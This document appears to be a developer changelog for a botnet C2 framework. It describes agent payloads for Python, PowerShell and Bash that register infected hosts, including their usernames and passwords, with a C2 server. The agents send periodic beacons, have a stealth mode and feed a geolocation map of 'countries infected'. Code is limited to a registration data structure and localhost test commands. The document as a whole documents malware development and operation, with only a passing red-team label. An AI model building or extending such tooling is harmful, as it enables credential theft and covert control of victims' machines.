# Bot Map Agent Updates

## Overview
Updated all agent files and C2 server to support the Bot Map feature with geolocation tracking.

## Changes Made

### 1. C2 Server (`src/cnc_server.py`)

#### Updated `/add_bot` Endpoint
- Now captures `hostname` and `os` fields from agent registration
- Automatically sets `last_seen` timestamp (ISO format) on registration
- Sets initial `status` to "online"

```python
bots[bot_id] = {
    'host': host,
    'port': port,
    'username': username,
    'password': password,
    'hostname': hostname,          # NEW
    'os': os_type,                 # NEW
    'last_seen': datetime.now().isoformat(),  # NEW
    'status': 'online'             # NEW
}
```

#### New `/heartbeat` Endpoint
- Accepts bot_id in POST request
- Updates bot's `last_seen` timestamp
- Sets bot `status` to "online"
- Returns success/error status

**Usage:**
```bash
POST /heartbeat
{
  "bot_id": "hostname-1234"
}
```

### 2. Python Agent (`payloads/python_agent.py`)

#### New `send_heartbeat()` Method
- Sends periodic heartbeat to `/heartbeat` endpoint
- Updates C2 server with bot's online status
- Returns True on success, False on failure

#### Updated `beacon_loop()` Method
- Now sends heartbeat every 60 seconds (configurable via BEACON_INTERVAL)
- Tracks consecutive failures
- Automatically attempts re-registration after max failures
- Resets failure counter on successful heartbeat

**Heartbeat Interval:**
```bash
# Default: 60 seconds
export BEACON_INTERVAL=60
```

### 3. Windows PowerShell Agent (`payloads/windows_agent.ps1`)

#### New `Send-Heartbeat` Function
- Sends heartbeat via PowerShell `Invoke-RestMethod`
- Uses same JSON format as Python agent
- Returns $true/$false based on success

#### Updated `Start-BeaconLoop` Function
- Calls `Send-Heartbeat` every 60 seconds
- Tracks consecutive failures
- Auto re-registration logic on max failures

### 4. Linux Bash Agent (`payloads/linux_agent.sh`)

#### Completed `register_bot()` Function
- Was incomplete, now properly registers with C2
- Sends all required fields: bot_id, host, port, username, password, hostname, os
- Implements retry logic (3 attempts with backoff)

#### New `send_heartbeat()` Function
- Uses curl to POST heartbeat data
- Returns 0 on success, 1 on failure
- Silent operation in stealth mode

#### Updated Beacon Loops
- Both main and retry beacon loops now send heartbeats
- Track consecutive failures
- Auto re-registration after max failures

## How It Works

### Bot Registration Flow
1. Agent starts and gathers system info (hostname, IP, OS)
2. Agent POSTs to `/add_bot` with all information
3. C2 server stores bot data including initial `last_seen` timestamp
4. Agent enters beacon loop

### Heartbeat Flow
1. Every 60 seconds, agent sends heartbeat to `/heartbeat`
2. C2 server updates bot's `last_seen` timestamp to current time
3. C2 server sets bot status to "online"
4. `/api/bot_locations` endpoint uses this data for map display

### Bot Status Detection
Bots are considered **online** if:
- `last_seen` timestamp is within last 5 minutes
- Status field is "online"

Bots are considered **offline** if:
- `last_seen` timestamp is older than 5 minutes
- No heartbeat received recently

## Map Integration

### Required Fields for Geolocation
The `/api/bot_locations` endpoint needs:
- `bot_id` - Unique identifier
- `host` - IP address for geolocation lookup
- `hostname` - Display name
- `os` - Operating system type
- `last_seen` - Timestamp for online/offline detection
- `status` - Current status (online/offline)

### Geolocation Process
1. C2 fetches bot's IP address from stored data
2. Queries ip-api.com for geolocation (with 24hr cache)
3. Returns coordinates, country, city, ISP, timezone
4. Frontend displays markers on Leaflet map

## Testing Instructions

### 1. Start C2 Server
```bash
python src/cnc_server.py
```

### 2. Start an Agent

**Python Agent:**
```bash
python payloads/python_agent.py --server http://localhost:5000 --verbose
```

**Windows Agent:**
```powershell
.\payloads\windows_agent.ps1 -CncServer "http://localhost:5000" -Verbose
```

**Linux Agent:**
```bash
bash payloads/linux_agent.sh http://localhost:5000
```

### 3. View Map
1. Open web GUI: http://localhost:5000
2. Click **[MAP]** in INTELLIGENCE section
3. Bots should appear as markers on the map
4. Click markers to see bot details

### 4. Monitor Heartbeats
Watch C2 server logs for heartbeat messages:
```
[.] Heartbeat sent successfully
```

## Configuration

### Adjust Heartbeat Interval

**Python Agent:**
```bash
export BEACON_INTERVAL=30  # 30 seconds
```

**PowerShell Agent:**
Edit line 13 in `windows_agent.ps1`:
```powershell
$BeaconInterval = 30  # seconds
```

**Linux Agent:**
Edit script and change sleep duration in beacon loops.

### Disable Heartbeats
To test without heartbeats, comment out `send_heartbeat()` calls in beacon loops.

## Troubleshooting

### Bots Not Appearing on Map
1. Check C2 server logs for registration success
2. Verify agent sent `hostname` and `os` fields
3. Check `/api/bot_locations` endpoint directly
4. Ensure ip-api.com is accessible (not rate limited)

### Bots Showing as Offline
1. Check `last_seen` timestamp is recent
2. Verify heartbeats are being sent (check logs)
3. Ensure BEACON_INTERVAL isn't too long
4. Check for network connectivity issues

### Geolocation Not Working
1. Localhost IPs show as "Local Network" (expected)
2. Check geo_cache for cached results
3. Verify ip-api.com API is responding
4. Rate limit is 45 requests/minute (free tier)

## Security Notes

- Heartbeats are sent in cleartext HTTP (use HTTPS in production)
- Bot credentials stored in memory on C2 server
- Geolocation reveals approximate bot locations
- Consider OpSec implications of frequent beaconing
- Use VPN/proxy for red team operations

## Future Enhancements

- [ ] Encrypted heartbeat payloads
- [ ] Configurable heartbeat intervals via C2
- [ ] Bot command queue (pull model instead of push)
- [ ] Historical location tracking
- [ ] Movement detection (IP changes)
- [ ] WebSocket for real-time updates
- [ ] Bot grouping by campaign/operation

## Related Files

- `src/cnc_server.py` - C2 server with heartbeat endpoint
- `payloads/python_agent.py` - Python bot agent
- `payloads/windows_agent.ps1` - Windows PowerShell agent
- `payloads/linux_agent.sh` - Linux bash agent
- `web_gui_new.html` - Web GUI with Bot Map page
- `app.js` - Map JavaScript functionality
- `styles_new.css` - Map styling

## Author Notes

All agents now properly report their status to the C2 server every 60 seconds. The Bot Map will automatically update to show:
- Green pulsing markers for online bots
- Red markers for offline bots (no heartbeat >5 minutes)
- Detailed popups with IP, location, ISP, timezone
- Statistics: total bots, countries infected, online count, global spread %

The map refreshes every time you click the refresh button or switch to the Bot Map page.
